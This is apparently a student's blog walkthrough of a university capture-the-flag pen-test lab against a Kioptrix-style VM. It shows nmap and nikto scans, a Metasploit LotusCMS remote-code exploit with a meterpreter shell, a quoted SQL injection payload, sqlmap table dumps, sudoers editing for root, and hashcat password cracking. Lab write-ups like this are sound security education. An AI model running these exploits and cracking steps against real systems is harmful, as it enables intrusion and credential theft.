---
author: Kush, Nishchal
date: '2019-03-20T00:09:26+10:00'
draft: false
tags:
- nmap
- netdiscover
- nikto
- pentest
- virtualbox
- metasploit
- ctf
- flag
- walkthrough
- penetration test
- ova
- vm
- virtual machine
title: Pen Test Assessment
---

# Penetration Test Assessment

A penetration test assessment was a requirement of a short cource on Penetration Testing from the Charles Sturt University. As part of the assessment, students were provided an ova image of a virtual machine. The virtual machine was to be the target of a penetration test, and students were expected to obtain flags for submission. A walkthrough of the assessment is presented here.

For the benefit of other students, the names and values of the flags have been redacted, and replaced with the string `REDACTED`

# Preperation

Both the target machine and the penetration testing machine are connected via a Virtualbox internal only network. To ensure that DHCP services are available on the internal network called `intnet`, configure a Virtualbox server using the following command to issue DHCP leases to network hosts connected to the intnet internal network:

```
VBoxManage dhcpserver add --netname intnet -ip 10.10.10.1 --netmask 255.255.255.0 --lowerip 10.10.10.10 --upperip 10.10.10.250 --enable
```

This command will make 10.10.10.1 the DHCP server, and issue DHCP leases in the range 10.10.10.10/24 to 10.10.10.250/24. Boot the penetration test machine, so that it is allocated 10.10.10.10. This approach makes it easy to identify the target host.

# Target

There are a number of ways of detecting the target host, either actively or passively. Since convertness is not a requirement we simply use the netdiscover command:

```
netdiscover -i eth1 -r 10.10.10.0/24 
```

Review of the results identified the target host as having the IP address of 10.10.10.10.

# Enumeration
Once the target has been identified, we can proceed to attempt o enumerate the services running on the target. Running the following command, we attempt to perform a default TCP connect on all ports on the host

```
nmap 10.10.10.11 -n -p- -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 14:23 GMT
Nmap scan report for 10.10.10.11
Host is up (0.0037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
```

There are two open ports available on the host, so we can take a closer look at these.

## Port 22

```
nmap 10.10.10.11 -p22 -A
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 14:29 GMT
Nmap scan report for 10.10.10.11
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

## Port 80

```
nmap 10.10.10.11 -p80 -A
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 14:31 GMT
Nmap scan report for 10.10.10.11
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
```

```
curl http://10.10.10.11
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
	<head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
  		<meta name="description" content="Your Site Description" />
  		<meta name="keywords" content="LotusCMS" />
		<meta name="author" content="name of author - Manjeet Singh Sawhney   www.manjeetss.com" />
		<link rel="stylesheet" type="text/css" href="style/comps/grey/css/style.css" media="screen" />
		<title>Ligoat Security - Got Goat? Security ...</title>
			</head>	
	<body>
		<div id="main">
			<div id="header">
				<div class="companyname">Ligoat Security</div>				
				<div id="right">
					
				</div>
			</div>
			<div id="navbar">
				<ul>
					<ul><li class='active'><a class='firstM' href='index.php?page=index'>Home</a></li><li><a class='normalM' href='index.php?system=Blog'>Blog</a></li><li><a class='lastM' href='index.php?system=Admin'>Login</a></li></ul>		</ul>
			</div>
			<div id="maincontent">
	          				<div class="content">
					<h1>Got Goat? Security ...</h1>
										<p>Got Goat? Security ...</p>
<p>We've revamped our website for the new release of the new gallery CMS we made. We are geared towards security...</p>
<p>We are so full of ourselves, we've put this on our dev-servers just to show how serious we are. Visit our blog section for more information on our new gallery system.</p>
<p>Or cut to the chase and see it <a href="/gallery">now!</a></p>				</div>
			</div>
			<div id="footer">
				<p>
					<!-- Leaving in my name and website link will be greatly appreciated in return for offering you this template for free. Thanking you in advance. -->
					&copy; 2011 Ligoat Security REDACTED
				</p>
			</div>
		</div>
	</body>
</html>

```

We can see the value of Flag1 in the HTML content. A couple of other observations were the reference to LotusCMS in the keywords meta tag, and looking at some of the URLs there may be a potential local file inclusion (LFI) vulnerability. However, since we know that port 80 is used by a valid web server, we can point a web scanner, such as nikto, to it to get some additional details

```
nikto -host 10.10.10.11
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.11
+ Target Hostname:    10.10.10.11
+ Target Port:        80
+ Start Time:         2019-03-19 14:48:03 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 20:22:00 2009
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7498 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2019-03-19 14:49:31 (GMT0) (88 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

We can also run a basic directory buster command to enumerate common directories

```
dirb http://10.10.10.11/ -l -oA dirb -r -w 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: A
START_TIME: Tue Mar 19 14:57:18 2019
URL_BASE: http://10.10.10.11/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Printing LOCATION header
OPTION: Not Recursive
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.11/ ----
==> DIRECTORY: http://10.10.10.11/cache/                                                                                         
==> DIRECTORY: http://10.10.10.11/core/                                                                                          
+ http://10.10.10.11/data (CODE:403|SIZE:322)                                                                                    
+ http://10.10.10.11/favicon.ico (CODE:200|SIZE:23126)                                                                           
==> DIRECTORY: http://10.10.10.11/gallery/                                                                                       
+ http://10.10.10.11/index.php (CODE:200|SIZE:1843)                                                                              
==> DIRECTORY: http://10.10.10.11/modules/                                                                                       
==> DIRECTORY: http://10.10.10.11/phpmyadmin/                                                                                    
+ http://10.10.10.11/server-status (CODE:403|SIZE:331)                                                                           
==> DIRECTORY: http://10.10.10.11/style/                                                                                         
                                                                                                                                 
-----------------
END_TIME: Tue Mar 19 14:57:42 2019
DOWNLOADED: 4612 - FOUND: 4

```

# Vulnerability Assessment

For vulnerbility assessment we take a closer look at the open TCP ports identified in the enumeration step to attempt to determine further details about the service, e.g. grabbing service banners, etc. 

# Exploitation

## Port 80 - phpMyAdmin

Navigated to http://10.10.10.11/phpmyadmin/, attempted login using default credentials, using username of admin and password as blank, was able to log in successfully, but access is limited to the schema only. The actual databases are not listed. We need to come back to this.



## Port 80 - LotusCMS

Searched metasploit for any known exploits against Lotus CMS, and ran the exploit to obtain a meterpreter shell. Using the meterpreter shell we can navigate the filesystem and list contents of files and locate Flag2, `REDACTED` in the open_me_up.txt file.

```
msf5 > search lotus

Matching Modules
================

   Name                                                     Disclosure Date  Rank       Check  Description
   ----                                                     ---------------  ----       -----  -----------
   auxiliary/dos/http/ibm_lotus_notes                       2017-08-31       normal     No     IBM Notes encodeURI DOS
   auxiliary/dos/http/ibm_lotus_notes2                      2017-08-31       normal     No     IBM Notes Denial Of Service
   auxiliary/dos/misc/ibm_sametime_webplayer_dos            2013-11-07       normal     No     IBM Lotus Sametime WebPlayer DoS
   auxiliary/gather/ibm_sametime_enumerate_users            2013-12-27       normal     No     IBM Lotus Notes Sametime User Enumeration
   auxiliary/gather/ibm_sametime_room_brute                 2013-12-27       normal     No     IBM Lotus Notes Sametime Room Name Bruteforce
   auxiliary/gather/ibm_sametime_version                    2013-12-27       normal     No     IBM Lotus Sametime Version Enumeration
   auxiliary/scanner/lotus/lotus_domino_hashes                               normal     Yes    Lotus Domino Password Hash Collector
   auxiliary/scanner/lotus/lotus_domino_login                                normal     Yes    Lotus Domino Brute Force Utility
   auxiliary/scanner/lotus/lotus_domino_version                              normal     Yes    Lotus Domino Version
   exploit/multi/http/lcms_php_exec                         2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
   exploit/windows/browser/ibmlotusdomino_dwa_uploadmodule  2007-12-20       normal     No     IBM Lotus Domino Web Access Upload Module Buffer Overflow
   exploit/windows/browser/inotes_dwa85w_bof                2012-06-01       normal     No     IBM Lotus iNotes dwa85W ActiveX Buffer Overflow
   exploit/windows/browser/notes_handler_cmdinject          2012-06-18       excellent  No     IBM Lotus Notes Client URL Handler Command Injection
   exploit/windows/browser/quickr_qp2_bof                   2012-05-23       normal     No     IBM Lotus QuickR qp2 ActiveX Buffer Overflow
   exploit/windows/fileformat/lotusnotes_lzh                2011-05-24       good       No     Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)
   exploit/windows/lotus/domino_http_accept_language        2008-05-20       average    No     IBM Lotus Domino Web Server Accept-Language Stack Buffer Overflow
   exploit/windows/lotus/domino_icalendar_organizer         2010-09-14       normal     Yes    IBM Lotus Domino iCalendar MAILTO Buffer Overflow
   exploit/windows/lotus/domino_sametime_stmux              2008-05-21       average    Yes    IBM Lotus Domino Sametime STMux.exe Stack Buffer Overflow
   exploit/windows/lotus/lotusnotes_lzh                     2011-05-24       normal     No     Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)


msf5 >use exploit/multi/http/lcms_php_exec
msf5 exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf5 exploit(multi/http/lcms_php_exec) > set RHOSTS 10.10.10.11
RHOSTS => 10.10.10.11
msf5 exploit(multi/http/lcms_php_exec) > set URI /
URI => /
msf5 exploit(multi/http/lcms_php_exec) > exploit

[*] Started reverse TCP handler on 10.10.10.10:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38247 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.11:55649) at 2019-03-19 15:06:26 +0000

meterpreter > getuid
Server username: www-data (33)
meterpreter > ls
Listing: /home/www/kioptrix3.com
================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   dir   2019-02-25 11:06:51 +0000  cache
40777/rwxrwxrwx   4096   dir   2011-04-14 17:24:17 +0100  core
40777/rwxrwxrwx   4096   dir   2011-04-14 17:24:17 +0100  data
100644/rw-r--r--  23126  fil   2011-04-14 17:23:13 +0100  favicon.ico
40755/rwxr-xr-x   4096   dir   2019-03-12 12:42:03 +0000  gallery
100644/rw-r--r--  26430  fil   2011-04-14 17:23:13 +0100  gnu-lgpl.txt
100644/rw-r--r--  399    fil   2011-04-14 17:23:13 +0100  index.php
40777/rwxrwxrwx   4096   dir   2011-04-14 17:24:17 +0100  modules
100644/rw-r--r--  38     fil   2019-02-25 13:08:14 +0000  open_me_up.txt
40777/rwxrwxrwx   4096   dir   2011-04-14 17:24:17 +0100  style
100644/rw-r--r--  243    fil   2011-04-14 17:23:13 +0100  update.php

meterpreter > cat open_me_up.txt
REDACTED
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
```

We can identify two accounts, loneferret and dreg from the password file.  Listing the /home directory we find that the home directories are not secured, and we can read the contents.

```
meterpreter > pwd
/home/loneferret
meterpreter > cat .bash_history
sudo ht
exit
meterpreter > 
```

Examination of the bash history for loneferret account indicates the execution of `sudo ht` command. Also review of the CompanyPolicy.README file also makes reference to using `sudo ht` for editing, creating and viewing of file.

## Port 80 - Gallarific

When visiting the /gallery/ site using a web-browser, we can see the header `Ligoat Security "Got Goat? Security...REDACTED`, which contains the same flag value as previously seen, i.e. REDACTED, but the prefix is different that previously seen, i.e. is REDACTED vs REDACTED.

Manually navigating around using the meterpreter shell we explore the gallery directory under `/home/www/kioptrix3.com/`. Examining the `version.txt` file we determine that this may be a Gallarific 2.1 application. A quick search using `searchsploit` indicates a possible SQL injection vulnerability. 

```
$searchsploit gallarific
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                 |  Path
                                                                                                                                               | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
GALLARIFIC PHP Photo Gallery Script - 'gallery.php' SQL Injection                                                                              | exploits/php/webapps/15891.txt
Gallarific - 'search.php?query' Cross-Site Scripting                                                                                           | exploits/php/webapps/31369.txt
Gallarific - 'user.php' Arbirary Change Admin Information                                                                                      | exploits/php/webapps/8796.html
Gallarific - Multiple Script Direct Request Authentication Bypass                                                                              | exploits/php/webapps/31370.txt
Gallarific 1.1 - '/gallery.php' Arbitrary Delete/Edit Category                                                                                 | exploits/php/webapps/9421.txt
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
$cat /usr/share/exploitdb/exploits/php/webapps/15891.txt
GALLARIFIC PHP Photo Gallery Script (gallery.php) Sql Injection Vulnerability 
=================================================================================

####################################################################
.:. Author         : AtT4CKxT3rR0r1ST  [F.Hack@w.cn]
.:. Script         : http://www.gallarific.com/download.php
.:. Dork           : inurl:"/gadmin/index.php"

####################################################################

===[ Exploit ]===

www.site.com/gallery.php?id=null[Sql Injection]

www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--

===[ Admin Panel ]===

www.site.com/gadmin/index.php

####################################################################
```

We attempted to point the `sqlmap` utility to the Gallarific site. Note that the `--time-sec` options was added after observing multiple messages regarding timeouts and throttling. Also specified the `--dbms` after the initial attempt identified the RDBMS as a MySQL database.

```
sqlmap -u "http://10.10.10.11/gallery/gallery.php?id=1" --dbms=MySQL --level=5 --risk=3 --dump --time-sec=10

<snip>

Database: gallery
Table: gallarific_users
[1 entry]
+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
| userid | photo   | email   | website | username | lastname | joincode | usertype  | password | firstname | datejoined | issuperuser |
+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+
| 1      | <blank> | <blank> | <blank> | admin    | User     | <blank>  | superuser | n0t7t1k4 | Super     | 1302628616 | 1           |
+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+

<snip>

Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+

<snip>
```

Before trying to crack what appears to be MD5 hashes using `john` the ripper (JtR), I did a quick search on https://crackstation.net/ and find the two hashes to be already cracked and result as `Mast3r` and `starwars` respectively

Moving back to the meterpreter session and continuing manual nagivation, we stumble upon the `gconfig.php` file. The file appears to contain variables defined for database connectivity. These credentials can now be used with phpMyAdmin to connect to and query the database.

```
meterpreter > pwd
/home/www/kioptrix3.com/gallery
meterpreter > cat gconfig.php
<?php
	error_reporting(0);

<snip>        

	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

	$GLOBALS["gallarific_mysql_server"] = "localhost";
	$GLOBALS["gallarific_mysql_database"] = "gallery";
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "REDACTED";

	// Setting Details -------------------------------------------------
<snip>        
```

## Port 22

Using the credentials for lineferret found previously, we attempt to SSH to the target host and subsequently attempt to escalate privileges after checking which commands the user is permitted to run using `sudo`. After receiving the error `Error opening terminal: xterm-256color.`, performed a Google search for `ssh "Error opening terminal: xterm-256color`, check on the first link and reset the TERM environment variable to xterm. This allowed the `ht` application to run as sudo.

```
$ssh loneferret@10.10.10.11
loneferret@10.10.10.11's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$
loneferret@Kioptrix3:~$
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
loneferret@Kioptrix3:~$
loneferret@Kioptrix3:~$
loneferret@Kioptrix3:~$ file /usr/local/bin/ht
/usr/local/bin/ht: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.8, dynamically linked (uses shared libs), not stripped
loneferret@Kioptrix3:~$
loneferret@Kioptrix3:~$
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ echo $TERM
xterm-256color
loneferret@Kioptrix3:~$ export TERM=xterm
loneferret@Kioptrix3:~$ sudo ht
```

Since the `ht` utility was running with elevated privileges, we were able to
find and open the `/root/c0ngr@ts.txt` file which contained what appeared to be
the Flag3 `REDACTED`. We can also edit the `/etc/sudoers` file to allow access to all commands.

```
# loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht
loneferret ALL=(ALL) ALL
```

Once open (F3) the `/etc/sudoers` file, make the change, save (F2) the file, and exit (CTRL-C) out of the `ht` utility, we can spawn a new shell with elevates privilges using the sudo command, e.g. `sudo bash`.

Using the privileged shell we can obtain a copy of the `/etc/passwd` and `/etc/shadow` files, and download them using the meterpreter session and attempt to crack the using John the Ripper (JTR). Using the default wordlist at `/usr/share/john/password.lst` we were able get `starwars` as the password for loneferret account (but we already knew this)

We can attempt to crack the root password using hashcat. To do this we first need to take the hash from the shadow file and save it in another file. The password hash is in the format of `$type$seed$hash` following the username in the `/etc/shadow` file. We saved this into a file called `hashcat-hash.txt`. We know that type 1 refers to MD5 in the shadow file, but we can verify this using the `hashid` script. For MD5 based hashes we need to specify a mode as 500 for hashcat. We attempt to use a wordlist based crack The root password had to be cracked using hashcat. We found the password to be `REDACTED`.

```
$sudo hashcat -m 500 -a 0 hashcat-hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i5-2400S CPU @ 2.50GHz, 1024/2959 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=500 -D _unroll'
* Device #1: Kernel m00500-pure.b9a54e26.kernel not found in cache! Building may take a while...
* Device #1: Kernel amp_a0.e597bae8.kernel not found in cache! Building may take a while...
Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$1$y6K33dTx$n8YmDZLU7EfsW35y96O1F1:REDACTED
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$y6K33dTx$n8YmDZLU7EfsW35y96O1F1
Time.Started.....: Fri Mar 22 10:06:01 2019 (1 sec)
Time.Estimated...: Fri Mar 22 10:06:02 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     8927 H/s (6.90ms) @ Accel:128 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 2560/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidates.#1....: gators -> dangerous

Started: Fri Mar 22 10:05:48 2019
Stopped: Fri Mar 22 10:06:03 2019
```

# Findings

This section summarises the credentials and flags found during the assessment. 

## User Credentails

The table below presents the accounts found, the associated password, and the type of account.

Account    | Password   | Type
-----------|------------|-----------
admin      | blank      | phpMyAdmin
admin      | `n0t7t1k4` | Gallarific
dreg       | `Mast3r`   | Gallarific
dreg       | `Mast3r`   | system
loneferret | `starwars` | Gallarific
loneferret | `starwars` | system
root       | `REDACTED` | MySQL
root       | `REDACTED` | system

## Flags

In the table below, the flag number, a brief name of the flag, the flag value, and a short description of where the flag was found, is presented to summarise the flags found during the assessment.

 Number | Name       | Value      | Description
--------|------------|------------|------------------------------------------------
 1      | `REDACTED` | `REDACTED` | Found in the HTML code of index.html page 
 1      | `REDACTED` | `REDACTED` | Found in the print command of the menu.php page 
 2      | `REDACTED` | `REDACTED` | Found in /home/www/kioptrix3.com/open_me_up.txt
 3      | `REDACTED` | `REDACTED` | Found in /root/c0ngr@ts.txt
 4      | `REDACTED` | `REDACTED` | Found in /home/www/kioptrix3.com/gallery/gconfig.php
 5      | `REDACTED` | `REDACTED` | Found in /etc/shadow using hashcat
